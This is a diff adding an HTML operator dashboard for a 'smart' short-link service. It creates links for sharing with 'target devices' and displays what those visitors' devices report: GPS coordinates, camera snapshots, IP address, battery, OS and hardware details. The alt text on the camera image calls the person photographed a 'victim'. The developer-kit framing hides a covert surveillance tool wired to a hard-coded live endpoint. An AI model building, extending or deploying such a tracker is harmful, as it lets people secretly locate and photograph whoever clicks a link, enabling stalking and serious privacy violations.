@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Smart Short Link Developer Kit & Reference Client</title>
+  
+  <!-- CSS & Style Assets -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            display: ['Space Grotesk', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: rgba(255, 255, 255, 0.02);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+  </style>
+</head>
+<body class="bg-[#09090b] text-zinc-100 min-h-screen font-sans antialiased selection:bg-blue-600/30 selection:text-blue-200">
+
+  <!-- Header Section -->
+  <header class="border-b border-zinc-800/60 bg-[#09090b]/80 backdrop-blur-md sticky top-0 z-50">
+    <div class="max-w-4xl mx-auto px-4 py-4 flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="h-8 w-8 rounded-lg bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center font-display font-bold text-white shadow-lg shadow-blue-500/10">
+          ⚡
+        </div>
+        <div>
+          <h1 class="font-display font-bold text-sm tracking-wide text-white uppercase flex items-center gap-1.5">
+            SmartLink Client <span class="text-[9px] bg-blue-500/10 border border-blue-500/20 text-blue-400 font-mono px-1.5 py-0.5 rounded tracking-normal normal-case">Reference Template</span>
+          </h1>
+          <p class="text-[10px] text-zinc-400 font-mono">Stand-alone Developer API Integrator</p>
+        </div>
+      </div>
+      <div>
+        <a href="" id="downloadBtn" download="smartline-client.html" class="bg-zinc-800/80 hover:bg-zinc-700/80 border border-zinc-750 text-zinc-200 px-3 py-1.5 rounded-lg text-xs font-medium font-mono transition-all flex items-center gap-1.5">
+          💾 Save Local COPY
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main class="max-w-4xl mx-auto px-4 py-8 space-y-8">
+
+    <!-- Overview Box -->
+    <div class="bg-gradient-to-r from-blue-950/20 to-zinc-900/40 border border-blue-500/10 rounded-2xl p-5 space-y-3">
+      <div class="flex items-start gap-3">
+        <div class="p-2 bg-blue-500/10 text-blue-400 rounded-lg text-xs font-bold leading-none">ℹ️</div>
+        <div>
+          <h2 class="text-xs font-bold text-white uppercase tracking-wider font-display">How Device-linked Tracking Works</h2>
+          <p class="text-xs text-zinc-400 mt-1 leading-relaxed">
+            This client helps developers integrate, test, and preview physical-level shortlink tracking capabilities. When you create a short URL, it binds locally to your browser's persistent <code class="bg-black/50 text-blue-300 font-mono px-1.5 py-0.5 rounded">deviceId</code>. Anyone visiting the link you generate will have their detailed ambient telemetry (GPS, battery, screen specs, WebGL renderer, and camera imagery optionally) sent back to this server. You can refresh and track clicks at any time below.
+          </p>
+        </div>
+      </div>
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[10px] font-mono border-t border-zinc-800/50 pt-3 text-zinc-500">
+        <div>🔒 <span class="text-zinc-400">Your Current Device ID:</span> <span id="currentDeviceIdEl" class="text-blue-400 font-bold">Generating...</span></div>
+        <div>🛰️ <span class="text-zinc-400">Configured API Endpoint:</span> <span id="apiEndpointEl" class="text-emerald-400 h-fit truncate inline-block max-w-[200px]">Checking...</span></div>
+      </div>
+    </div>
+
+    <!-- Main Grid Workspace -->
+    <div class="grid grid-cols-1 md:grid-cols-12 gap-6">
+      
+      <!-- Creator Form Screen (7 cols) -->
+      <section class="md:col-span-7 space-y-6">
+        <div class="bg-zinc-900/40 border border-zinc-800 rounded-2xl p-6 space-y-5">
+          <div>
+            <h3 class="text-xs font-bold tracking-widest text-zinc-400 uppercase font-display">1. Create Smart Redirect Link</h3>
+            <p class="text-[10px] text-zinc-500 mt-0.5">Parameters map clean payload options directly into our shortening router</p>
+          </div>
+
+          <form id="creatorForm" class="space-y-4 text-xs">
+            <!-- Long URL Input -->
+            <div class="space-y-1.5">
+              <label class="block text-zinc-400 font-medium">Target Destination (Long URL)</label>
+              <input type="url" id="longUrl" required placeholder="https://youtube.com/watch?v=dQw4w9WgXcQ" 
+                class="w-full bg-black/40 border border-zinc-800 focus:border-blue-500 rounded-xl px-4 py-2.5 text-zinc-200 outline-none transition-all placeholder:text-zinc-600 font-mono" />
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <!-- Custom Alias input -->
+              <div class="space-y-1.5">
+                <label class="block text-zinc-400 font-medium">Custom URL Alias <span class="text-zinc-600">(Optional)</span></label>
+                <input type="text" id="customAlias" placeholder="customprefix" 
+                  class="w-full bg-black/40 border border-zinc-800 focus:border-blue-500 rounded-xl px-4 py-2.5 text-zinc-200 outline-none transition-all placeholder:text-zinc-600 font-mono" />
+              </div>
+
+              <!-- Phone identification back-sync -->
+              <div class="space-y-1.5">
+                <label class="block text-zinc-400 font-medium">Telegram Bot Identifier <span class="text-red-500">*</span></label>
+                <input type="text" id="phoneNumber" required placeholder="+1234567890" 
+                  class="w-full bg-black/40 border border-zinc-800 focus:border-blue-500 rounded-xl px-4 py-2.5 text-zinc-200 outline-none transition-all placeholder:text-zinc-600 font-mono" />
+                <p class="text-[10px] text-zinc-500 font-sans mt-0.5">Used to bridge and access results on your bot terminals</p>
+              </div>
+            </div>
+
+            <!-- Interceptor Intel Capabilities Toggles -->
+            <div class="bg-black/30 border border-zinc-800/80 rounded-xl p-4 space-y-3">
+              <span class="text-[10px] font-bold text-zinc-400 uppercase tracking-widest font-mono">Advanced Intelligence Capabilities</span>
+              
+              <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5 pt-1">
+                <!-- Camera verification authorization request -->
+                <label class="flex items-start gap-3 cursor-pointer select-none group">
+                  <div class="relative mt-0.5 flex items-center justify-center">
+                    <input type="checkbox" id="captureCamera" class="sr-only peer" />
+                    <div class="w-4 h-4 rounded border border-zinc-700 bg-zinc-900 group-hover:border-blue-500 peer-checked:bg-blue-600 peer-checked:border-blue-600 flex items-center justify-center transition-all">
+                      <svg class="w-3 h-3 text-white hidden peer-checked:block" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                  </div>
+                  <div class="text-[11px]">
+                    <span class="block text-zinc-300 font-medium font-sans">Camera verification</span>
+                    <span class="block text-[9.5px] text-zinc-600">Captured camera video snapshot on click verification</span>
+                  </div>
+                </label>
+
+                <!-- Location verification tracking -->
+                <label class="flex items-start gap-3 cursor-pointer select-none group">
+                  <div class="relative mt-0.5 flex items-center justify-center">
+                    <input type="checkbox" id="captureLocation" class="sr-only peer" />
+                    <div class="w-4 h-4 rounded border border-zinc-700 bg-zinc-900 group-hover:border-blue-500 peer-checked:bg-blue-600 peer-checked:border-blue-600 flex items-center justify-center transition-all">
+                      <svg class="w-3 h-3 text-white hidden peer-checked:block" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                      </svg>
+                    </div>
+                  </div>
+                  <div class="text-[11px]">
+                    <span class="block text-zinc-300 font-medium font-sans">GPS Location</span>
+                    <span class="block text-[9.5px] text-zinc-600">Gather exact physical hardware coordinates mapping</span>
+                  </div>
+                </label>
+              </div>
+            </div>
+
+            <!-- Submit trigger -->
+            <button type="submit" id="submitBtn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-medium py-3 px-4 rounded-xl transition-all shadow-lg hover:shadow-blue-500/20 active:scale-[0.99] font-display uppercase tracking-wider text-xs">
+              Generate SmartLink & Sync
+            </button>
+          </form>
+
+          <!-- Shortener Result Display Card -->
+          <div id="resultCard" class="hidden bg-emerald-500/5 border border-emerald-500/20 rounded-2xl p-5 space-y-3.5">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="bg-emerald-500/10 text-emerald-400 text-[9px] border border-emerald-500/20 font-bold uppercase tracking-wider px-2 py-0.5 rounded-full font-mono">
+                  Link Created Successfully
+                </span>
+                <p class="text-[11px] text-zinc-400 mt-1 font-sans">Share this generated zone alias link with target devices:</p>
+              </div>
+            </div>
+            
+            <div class="flex items-center gap-2 bg-black/40 border border-zinc-800 rounded-xl p-3">
+              <span id="shortResult" class="text-sm font-bold text-white font-mono flex-1 select-all truncate">https://shot.zone.id/loading...</span>
+              <button id="copyBtn" class="bg-zinc-800 hover:bg-zinc-750 text-zinc-200 border border-zinc-700 px-3.5 py-1.5 rounded-lg text-xs font-medium font-mono transition-all">
+                Copy
+              </button>
+            </div>
+          </div>
+
+          <!-- Error Logging Card -->
+          <div id="errorCard" class="hidden bg-red-500/5 border border-red-500/20 text-red-400 text-xs px-4 py-3 rounded-xl font-mono"></div>
+        </div>
+      </section>
+
+      <!-- API Documentation View (5 cols) -->
+      <section class="md:col-span-5 space-y-6">
+        <div class="bg-zinc-900/40 border border-zinc-800 rounded-2xl p-6 space-y-4">
+          <div>
+            <h3 class="text-xs font-bold tracking-widest text-zinc-400 uppercase font-display">Developer API Specs</h3>
+            <p class="text-[10px] text-zinc-500 mt-0.5">Use raw HTTP methods to bypass any interface client directly</p>
+          </div>
+
+          <div class="space-y-4 font-mono text-[10px] text-zinc-400">
+            <!-- POST Docs -->
+            <div class="space-y-1.5 p-3.5 bg-black/40 border border-zinc-800 rounded-xl">
+              <div class="flex items-center gap-2 text-green-400 font-bold font-mono text-[11px]">
+                <span class="bg-green-500/10 border border-green-500/20 text-green-400 text-[9px] px-1.5 py-0.5 rounded">POST</span>
+                <span>/api/shorten</span>
+              </div>
+              <p class="text-[9.5px] text-zinc-500 font-sans">Creates a tracking bridge link and establishes the configuration profile.</p>
+              <div class="text-[9px] border-t border-zinc-800/60 pt-2 space-y-1">
+                <div><span class="text-zinc-500">longUrl:</span> "https://dest..." (<span class="text-red-500">req</span>)</div>
+                <div><span class="text-zinc-500">phoneNumber:</span> "+123456" (<span class="text-red-500">req</span>)</div>
+                <div><span class="text-zinc-500 font-bold">deviceId:</span> "random_uuid" (<span class="text-blue-400">opt</span>)</div>
+                <div><span class="text-zinc-500">captureCamera:</span> true/false (<span class="text-blue-400">opt</span>)</div>
+              </div>
+            </div>
+
+            <!-- GET Docs -->
+            <div class="space-y-1.5 p-3.5 bg-black/40 border border-zinc-800 rounded-xl">
+              <div class="flex items-center gap-2 text-blue-400 font-bold font-mono text-[11px]">
+                <span class="bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[9px] px-1.5 py-0.5 rounded">GET</span>
+                <span>/api/shorten</span>
+              </div>
+              <p class="text-[9.5px] text-zinc-500 font-sans">Queries all captured telemetry clicks associated with either matching identity.</p>
+              <div class="text-[9px] border-t border-zinc-800/60 pt-2 space-y-1 text-zinc-500">
+                <div>Query string:</div>
+                <div>• <code class="text-zinc-300">?phoneNumber=+123456</code></div>
+                <div>• <code class="text-zinc-300">?deviceId=random_uuid</code></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <!-- Live Captured Analytics & Streams List (FULL width) -->
+    <section class="bg-zinc-900/40 border border-zinc-800 rounded-2xl p-6 space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-zinc-800/60 pb-5">
+        <div>
+          <h3 class="text-xs font-bold tracking-widest text-zinc-300 uppercase font-display flex items-center gap-2">
+            📊 Live Captured Intelligence Feed <span class="bg-blue-500/10 border border-blue-500/20 text-blue-400 font-mono text-[9px] px-1.5 py-0.5 rounded uppercase normal-case">Latest on Top</span>
+          </h3>
+          <p class="text-[10px] text-zinc-500 mt-0.5 font-sans">Real-time tracker activity querying and base64 video/photo processing engine</p>
+        </div>
+
+        <div class="flex items-center gap-3">
+          <button type="button" id="refreshIntelBtn" class="w-full sm:w-auto bg-blue-600 hover:bg-blue-500 text-white border border-blue-700 font-bold font-mono text-[10.5px] px-4 py-2 rounded-xl transition-all uppercase tracking-wider shadow-lg shadow-blue-500/5">
+            Check Streams
+          </button>
+        </div>
+      </div>
+
+      <!-- Live Stream Containers -->
+      <div id="intelSection" class="hidden space-y-6">
+        
+        <!-- Imagery Hub Card -->
+        <div id="latestIntelImgCard" class="hidden bg-black/40 border border-zinc-800/80 rounded-2xl p-6 flex flex-col items-center justify-center space-y-4">
+          <span class="bg-red-500/10 text-red-500 border border-red-500/20 text-[9.5px] font-bold uppercase tracking-wider font-mono px-3 py-1 rounded-full flex items-center gap-1.5 animated pulse">
+            <span class="h-2 w-2 rounded-full bg-red-500 animate-ping"></span> 📸 Dynamic Camera Snaps Detected
+          </span>
+          <div class="relative max-w-lg w-full rounded-xl overflow-hidden border border-zinc-700/50 bg-zinc-950/80 shadow-2xl">
+            <img id="latestIntelImg" class="w-full object-contain max-h-[350px]" src="" alt="Latest victim verification capture" />
+          </div>
+        </div>
+
+        <!-- Telemetry Cards Stack -->
+        <div class="space-y-4">
+          <span class="text-[10px] font-bold text-zinc-500 uppercase tracking-widest font-mono block">Sequential Traffic Logs</span>
+          <div id="logsContainers" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <!-- Dynamically populated via script -->
+          </div>
+        </div>
+      </div>
+
+      <!-- Empty State View -->
+      <div id="logsEmptyState" class="text-center py-12 bg-black/10 border border-zinc-850/40 rounded-2xl">
+        <div class="text-2xl mb-2">🔭</div>
+        <p class="text-xs text-zinc-400 font-medium">No active connections recorded</p>
+        <p class="text-[10px] text-zinc-600 mt-1 max-w-xs mx-auto">Input your bot phone number and hit "Check Streams" to sync tracking telemetry logs instantly.</p>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Script Actions -->
+  <script>
+    // Config: API connection targets.
+    // If opened as local file (e.g. from file:///), fall back to deployed portal path; else resolve natively.
+    const getBaseUrl = () => {
+      if (window.location.protocol === 'file:') {
+        return 'https://ais-pre-c35cddpwibg2oqcpxijqlz-21412174491.europe-west1.run.app';
+      }
+      return window.location.origin;
+    };
+
+    const API_BASE = getBaseUrl();
+
+    // 1. Manage Device Identity (UUID)
+    let deviceId = localStorage.getItem('__smart_dev_id');
+    if (!deviceId) {
+      // Create random mock identity for reference testing
+      const parts = [];
+      const hex = '0123456789abcdef';
+      for (let i = 0; i < 32; i++) {
+        parts.push(hex[Math.floor(Math.random() * 16)]);
+        if ([8, 12, 16, 20].includes(i)) parts.push('-');
+      }
+      deviceId = parts.join('');
+      localStorage.setItem('__smart_dev_id', deviceId);
+    }
+
+    // Populate metadata UI fields
+    document.getElementById('currentDeviceIdEl').textContent = deviceId;
+    document.getElementById('apiEndpointEl').textContent = API_BASE;
+    document.getElementById('apiEndpointEl').title = API_BASE;
+    
+    // Set current download payload
+    const downloadBtn = document.getElementById('downloadBtn');
+    if (downloadBtn) {
+      downloadBtn.href = window.location.href;
+    }
+
+    // Interactive Fields Setup
+    const form = document.getElementById('creatorForm');
+    const resultCard = document.getElementById('resultCard');
+    const shortResult = document.getElementById('shortResult');
+    const copyBtn = document.getElementById('copyBtn');
+    const errorCard = document.getElementById('errorCard');
+
+    const refreshIntelBtn = document.getElementById('refreshIntelBtn');
+    const intelSection = document.getElementById('intelSection');
+    const logsEmptyState = document.getElementById('logsEmptyState');
+    const logsContainers = document.getElementById('logsContainers');
+    const latestIntelImgCard = document.getElementById('latestIntelImgCard');
+    const latestIntelImg = document.getElementById('latestIntelImg');
+
+    // Load previously used configurations if any exists
+    const persistedPhone = localStorage.getItem('__smart_persisted_phone');
+    if (persistedPhone) {
+      document.getElementById('phoneNumber').value = persistedPhone;
+    }
+
+    // Link Generation Action (POST)
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      resultCard.classList.add('hidden');
+      errorCard.classList.add('hidden');
+
+      const longUrl = document.getElementById('longUrl').value.trim();
+      const customAlias = document.getElementById('customAlias').value.trim();
+      const phoneNumber = document.getElementById('phoneNumber').value.trim();
+      const captureCamera = document.getElementById('captureCamera').checked;
+      const captureLocation = document.getElementById('captureLocation').checked;
+
+      if (!phoneNumber) {
+        errorCard.textContent = 'Phone number identifier is required to establish identification.';
+        errorCard.classList.remove('hidden');
+        return;
+      }
+
+      // Persist phone for usability
+      localStorage.setItem('__smart_persisted_phone', phoneNumber);
+
+      const submitBtn = document.getElementById('submitBtn');
+      submitBtn.textContent = 'GENERATING SMART DIRECTS...';
+      submitBtn.disabled = true;
+
+      try {
+        const response = await fetch(`${API_BASE}/api/shorten`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            longUrl,
+            customAlias: customAlias || undefined,
+            phoneNumber,
+            captureCamera,
+            captureLocation,
+            deviceId // pass persistent client device scope ID
+          })
+        });
+
+        const resData = await response.json();
+        if (!response.ok) {
+          throw new Error(resData.error || 'Server rejected request');
+        }
+
+        shortResult.textContent = resData.shortUrl;
+        resultCard.classList.remove('hidden');
+        
+        // Copy automatic clipboard
+        try {
+          await navigator.clipboard.writeText(resData.shortUrl);
+          copyBtn.textContent = 'Copied!';
+          setTimeout(() => copyBtn.textContent = 'Copy', 2000);
+        } catch (copyErr) {
+          console.warn('Unable to automatically copy:', copyErr);
+        }
+
+      } catch (err) {
+        errorCard.textContent = err.message;
+        errorCard.classList.remove('hidden');
+      } finally {
+        submitBtn.textContent = 'Generate SmartLink & Sync';
+        submitBtn.disabled = false;
+      }
+    });
+
+    // Copy Manual Event Triggerer
+    copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(shortResult.textContent);
+      copyBtn.textContent = 'Copied!';
+      setTimeout(() => copyBtn.textContent = 'Copy', 2000);
+    });
+
+    // Analytics Dashboard Retrieval Action (GET)
+    async function loadLatestLogs() {
+      const phoneNumber = document.getElementById('phoneNumber').value.trim();
+      
+      // We will perform fallback query search. First check for phone number. If there is no phone, fallback onto local DeviceId
+      let requestUrlStr = `${API_BASE}/api/shorten?`;
+      if (phoneNumber) {
+        requestUrlStr += `phoneNumber=${encodeURIComponent(phoneNumber)}`;
+      } else {
+        requestUrlStr += `deviceId=${encodeURIComponent(deviceId)}`;
+      }
+
+      refreshIntelBtn.textContent = 'LOADING STREAMS...';
+      refreshIntelBtn.disabled = true;
+
+      try {
+        const response = await fetch(requestUrlStr);
+        const data = await response.json();
+        
+        if (!response.ok) {
+          throw new Error(data.error || 'Failed to query database streams.');
+        }
+
+        logsContainers.innerHTML = '';
+        latestIntelImgCard.classList.add('hidden');
+
+        if (!data.logs || data.logs.length === 0) {
+          intelSection.classList.add('hidden');
+          logsEmptyState.classList.remove('hidden');
+          return;
+        }
+
+        logsEmptyState.classList.add('hidden');
+        intelSection.classList.remove('hidden');
+
+        // Extract list of entries (GET returns with newest first on top!)
+        const clicks = data.logs;
+
+        // Check if there is any snap imagery content
+        const latestWithImg = clicks.find(c => c.captured_image);
+        if (latestWithImg) {
+          latestIntelImg.src = latestWithImg.captured_image;
+          latestIntelImgCard.classList.remove('hidden');
+        }
+
+        // Render cards
+        clicks.forEach((log) => {
+          const card = document.createElement('div');
+          card.className = "bg-zinc-900/50 border border-zinc-800/80 rounded-2xl p-5 text-[11px] font-sans space-y-3 text-zinc-300 relative overflow-hidden flex flex-col justify-between";
+          
+          let cameraBadge = '';
+          if (log.captured_image) {
+            cameraBadge = '<span class="bg-red-500/10 text-red-400 border border-red-500/15 px-2 py-0.5 rounded text-[8.5px] font-bold uppercase tracking-wider font-mono">📸 Live Snapshot</span>';
+          }
+
+          let locationStr = log.city || log.location_name || 'Inferred Location';
+          let mapLink = '';
+          if (log.latitude && log.longitude) {
+            mapLink = `<a href="https://www.google.com/maps?q=${log.latitude},${log.longitude}" target="_blank" class="text-blue-400 hover:text-blue-300 font-bold hover:underline transition-all">🗺️ Maps Routing</a>`;
+          } else {
+            mapLink = '<span class="text-zinc-650">No GPS Auth</span>';
+          }
+
+          const localTime = new Date(log.created_at).toLocaleString();
+
+          card.innerHTML = `
+            <div>
+              <div class="flex items-center justify-between gap-1 mb-2.5">
+                <span class="font-bold text-white uppercase tracking-wider text-[9px] font-mono">📍 Code: <span class="text-blue-400">${log.short_code || "N/A"}</span></span>
+                <div class="flex items-center gap-1.5">
+                  ${cameraBadge}
+                  <span class="text-zinc-500 text-[9px] font-mono">${localTime}</span>
+                </div>
+              </div>
+              <div class="grid grid-cols-2 gap-x-4 gap-y-2 text-zinc-400 font-mono text-[10px] border-t border-zinc-800/60 pt-2.5">
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">IP Address</span> <span class="text-zinc-300">${log.ip_address || "Unknown"}</span></div>
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">Target City</span> <span class="text-zinc-300 font-sans font-bold">${locationStr}</span></div>
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">System OS</span> <span class="text-zinc-300 font-sans">${log.os || log.device_type || "Unknown"}</span></div>
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">Web Browser</span> <span class="text-zinc-300 font-sans">${log.browser || "Unknown"}</span></div>
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">Power Feed</span> <span class="text-zinc-300">${log.battery_level ? Math.round(log.battery_level * 100) + "%" : "N/A"}&nbsp;${log.is_charging ? "⚡" : ""}</span></div>
+                <div><span class="text-zinc-600 font-sans font-bold uppercase text-[8.5px] tracking-wider block">Hardware Memory</span> <span class="text-zinc-200">${log.device_memory ? log.device_memory + " GB" : "N/A"}</span></div>
+              </div>
+            </div>
+            <div class="border-t border-zinc-800/40 pt-2 flex items-center justify-between text-[10px] font-mono mt-3">
+              <span class="text-zinc-650">Network: <strong class="text-zinc-400 font-sans">${log.network_type || "N/A"}</strong></span>
+              ${mapLink}
+            </div>
+          `;
+          
+          logsContainers.appendChild(card);
+        });
+
+      } catch (err) {
+        alert('Analytics error: ' + err.message);
+      } finally {
+        refreshIntelBtn.textContent = 'Check Streams';
+        refreshIntelBtn.disabled = false;
+      }
+    }
+
+    refreshIntelBtn.addEventListener('click', loadLatestLogs);
+
+    // Dynamic initial loading trigger to pull status
+    if (phoneNumber) {
+      setTimeout(loadLatestLogs, 500);
+    }
+  </script>
+</body>
+</html>
